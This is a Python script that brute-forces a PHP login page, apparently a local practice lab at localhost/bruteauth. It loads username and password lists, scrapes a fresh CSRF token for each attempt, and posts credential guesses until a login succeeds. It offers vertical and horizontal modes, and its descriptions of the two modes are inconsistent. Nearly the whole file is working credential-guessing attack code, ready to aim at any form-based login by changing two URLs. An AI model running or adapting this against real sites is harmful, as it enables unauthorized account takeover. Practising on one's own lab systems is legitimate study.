import requests
from bs4 import BeautifulSoup
import time

# URLs for login and CSRF token retrieval
LOGIN_URL = 'http://localhost/bruteauth/login.php'
AUTH_URL = 'http://localhost/bruteauth/authenticate.php'

# Load username and password lists
try:
    with open('usernames.txt', 'r') as file:
        usernames = [line.strip() for line in file.readlines()]

    with open('passwords.txt', 'r') as file:
        passwords = [line.strip() for line in file.readlines()]
except FileNotFoundError as e:
    print(f"Error: {e}")
    exit(1)

def fetch_csrf_token(session):
    """Fetch CSRF token from the login page."""
    response = session.get(LOGIN_URL)
    if response.status_code != 200:
        print("Failed to retrieve login page.")
        return None
    
    # Extract CSRF token from the page
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf_token'})
    
    if csrf_token is None:
        print("CSRF token not found.")
        return None
    
    print(f"CSRF Token: {csrf_token['value']}")  # Print CSRF token
    return csrf_token['value']

def attempt_login(session, username, password, csrf_token):
    """Attempt to login with given username, password, and CSRF token."""
    headers = {
        'User-Agent': 'Mozilla/5.0',
    }

    login_data = {
        'username': username,
        'password': password,
        'csrf_token': csrf_token
    }
    
    response = session.post(AUTH_URL, data=login_data, headers=headers)
    return response

def brute_force_login():
    """Perform vertical brute-force attack."""
    with requests.Session() as session:
        # Get PHPSESSID from the initial request
        session.get(LOGIN_URL)
        
        for username in usernames:
            for password in passwords:
                csrf_token = fetch_csrf_token(session)  # Fetch a new CSRF token for each attempt
                if csrf_token is None:
                    break  # Stop if we couldn't fetch the CSRF token
                
                response = attempt_login(session, username, password, csrf_token)
                
                # Print PHPSESSID
                print(f"PHPSESSID: {session.cookies.get('PHPSESSID')}")  # Print PHPSESSID
                
                # Check if login was successful based on response content
                if "Login successful!" in response.text:
                    print(f"Successful login for username: {username} with password: {password}")
                    break  # Stop further attempts for this user
                elif "Invalid credentials" in response.text:
                    print(f"Failed login for {username}:{password}")
                else:
                    print(f"Unexpected response for {username}:{password}")

                time.sleep(1)  # Sleep to prevent overwhelming the server

def horizontal_brute_force(single_username):
    """Perform horizontal brute-force attack for a single user."""
    with requests.Session() as session:
        # Get PHPSESSID from the initial request
        session.get(LOGIN_URL)
        
        csrf_token = fetch_csrf_token(session)
        if csrf_token is None:
            return  # Stop if we couldn't fetch the CSRF token
        
        for password in passwords:
            response = attempt_login(session, single_username, password, csrf_token)

            # Print PHPSESSID
            print(f"PHPSESSID: {session.cookies.get('PHPSESSID')}")  # Print PHPSESSID
            
            if "Login successful!" in response.text:
                print(f"Successful login for username: {single_username} with password: {password}")
                break
            elif "Invalid credentials" in response.text:
                print(f"Failed login for {single_username}:{password}")
            else:
                print(f"Unexpected response for {single_username}:{password}")

            time.sleep(1)  # Sleep to prevent overwhelming the server

# Choose the attack type
print("Select attack type: \n1. Vertical (multiple users, single password list)\n2. Horizontal (single user, multiple passwords)")
choice = input("Enter choice (1 or 2): ")

if choice == "1":
    brute_force_login()  # Calls vertical attack function
elif choice == "2":
    target_username = input("Enter the username for horizontal brute-force: ")
    horizontal_brute_force(target_username)  # Calls horizontal attack function
else:
    print("Invalid choice.")
